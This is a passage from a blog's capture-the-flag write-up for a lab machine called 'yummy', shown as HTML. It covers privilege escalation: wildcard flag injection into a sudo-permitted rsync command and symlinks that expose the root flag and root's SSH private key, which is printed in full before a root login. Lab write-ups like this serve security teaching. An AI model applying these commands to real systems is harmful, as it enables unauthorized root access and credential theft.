+uid=1000(dev) gid=1000(dev) groups=1000(dev)</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780f3aed7c4b3c01b4f4e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f78003833ede7e5e9885df" class="Divider"></div><h3 id="https://www.notion.so/1a30b98a88f7806e908fcdd31441f690" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1a30b98a88f7806e908fcdd31441f690"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/1a30b98a88f78052ac3ccffa770846bd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Sudo </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">rsync</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780e2b94fd18e69bdc0de" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~$</span></mark></span><span class="SemanticString"><span> sudo -l
+
+Matching Defaults entries for dev on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f7800b99ace90f8b061ecb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev</code></span><span class="SemanticString"> can run a specific </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rsync</code></span><span class="SemanticString"> command as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString"> with no password. The command contains a wildcard, making it possible to inject dangerous flags within it. There’s also a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gtfobins.github.io/gtfobins/rsync/">GTFOBins page</a></span><span class="SemanticString"> for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rsync</code></span><span class="SemanticString">, but its payload didn’t work here.</span></span></p></div><div id="https://www.notion.so/1a30b98a88f78051bce7db581c3d2a04" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rsync</code></span><span class="SemanticString">&#x27;s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://linux.die.net/man/1/rsync">docs</a></span><span class="SemanticString">, there’s two more dangerous flags that can be useful here:</span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/1a30b98a88f780d79dd9edc5d6ba86ac" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-L</code></span><span class="SemanticString">, which makes </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rsync</code></span><span class="SemanticString"> copy the actual files instead of symlinks; and</span></span></li><li id="https://www.notion.so/1a30b98a88f780b893c5fd7f37ad576a" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--chmod:777</code></span><span class="SemanticString">, which grants 777 permissions for all the files copied.</span></span></li></ol><div id="https://www.notion.so/1a30b98a88f780a6a909f024276f6bf6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Combining these two flags would grant the ability to read any files in the filesystem. For example, I can create a symlink in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app-production</code></span><span class="SemanticString"> pointing to the root flag:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780a5ab6cf167940bef53" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~/app-production$</span></mark></span><span class="SemanticString"><span> ln -s /root/root.txt rootflag
+</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78060b156d4eeb3e32459" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After running the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">rsync</code></span><span class="SemanticString"> command, the root flag is copied to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/opt/app</code></span><span class="SemanticString"> and is globally readable:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f78057a9afc24bb826c96a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~$</span></mark></span><span class="SemanticString"><span> sudo rsync -a --exclude=.hg /home/dev/app-production/* -L --chmod=777 /opt/app/
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~$</span></mark></span><span class="SemanticString"><span> ls -la /opt/app
+
+total 44
+drwxr-xr-x 7 root www-data  4096 Feb 21 17:44 .
+drwxr-xr-x 3 root root      4096 Sep 30 08:16 ..
+-rwxrwxrwx 1 dev  dev      10037 May 28  2024 app.py
+drwxrwxrwx 3 dev  dev       4096 May 28  2024 config
+drwxrwxrwx 3 dev  dev       4096 May 28  2024 middleware
+drwxrwxr-x 2 root root      4096 Sep 25 14:00 __pycache__
+-rwxrwxrwx 1 root root        33 Feb 21 11:50 rootflag
+drwxrwxrwx 6 dev  dev       4096 May 28  2024 static
+drwxrwxrwx 2 dev  dev       4096 May 28  2024 templates</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780eaa4efd7dc46139be5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The same can be done for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString">&#x27;s SSH key:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780d19a7ce9c2554529e1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~/app-production$</span></mark></span><span class="SemanticString"><span> ln -s /root/.ssh/id_rsa sshkey</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780a2b074e56872837ee1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1a30b98a88f78017bd1fe0014a8cd3a4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~$</span></mark></span><span class="SemanticString"><span> sudo rsync -a --exclude=.hg /home/dev/app-production/* -L --chmod=777 /opt/app/
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~$</span></mark></span><span class="SemanticString"><span> ls -la /opt/app
+
+total 44
+drwxr-xr-x 7 root www-data  4096 Feb 21 17:48 .
+drwxr-xr-x 3 root root      4096 Sep 30 08:16 ..
+-rwxrwxrwx 1 dev  dev      10037 May 28  2024 app.py
+drwxrwxrwx 3 dev  dev       4096 May 28  2024 config
+drwxrwxrwx 3 dev  dev       4096 May 28  2024 middleware
+drwxrwxr-x 2 root root      4096 Sep 25 14:00 __pycache__
+-rwxrwxrwx 1 root root       399 May 28  2024 sshkey
+drwxrwxrwx 6 dev  dev       4096 May 28  2024 static
+drwxrwxrwx 2 dev  dev       4096 May 28  2024 templates
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dev@yummy:~$</span></mark></span><span class="SemanticString"><span> cat /opt/app/sshkey
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8AAAAJBdGlFYXRpR
+WAAAAAtzc2gtZWQyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8A
+AAAEA+trd9XqxX3ZSG9ESLlPSzIadF8ll0l4ll0+DKkhpkhvy3/CwUede4pnDoZVSY9I88
+e2rHHU33htpO3X/Z6wXwAAAACnJvb3RAeXVtbXkBAgM=
+-----END OPENSSH PRIVATE KEY-----</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780aa9f0bf997a58b9d5c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use it to SSH in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString"> and grab the flag:</span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780088e09d9bee94542e0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/yummy]
+└─$</span></mark></span><span class="SemanticString"><span> ssh root@yummy.htb -i root.key
+
+Warning: Permanently added &#x27;yummy.htb&#x27; (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri Feb 21 05:50:07 PM UTC 2025
+
+  System load:  0.78              Processes:             281
+  Usage of /:   62.0% of 5.56GB   Users logged in:       2
+  Memory usage: 22%               IPv4 address for eth0: 10.129.195.30
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+10 updates can be applied immediately.
+10 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+You have new mail.
+Last login: Fri Feb 21 17:50:08 2025 from 10.10.14.24
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@yummy:~#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f78082abd2dd37ce86d6db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780a28030e35ab62a6dce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1a30b98a88f780ffad89f7a454fb2f85" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@yummy:~#</span></mark></span><span class="SemanticString"><span> cat root.txt
+
+33ad4f1f************************</span></span></span></code></pre><div id="https://www.notion.so/1a30b98a88f780cb93afd701498b49aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1a30b98a88f780b9bd42dbf672f019f7" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
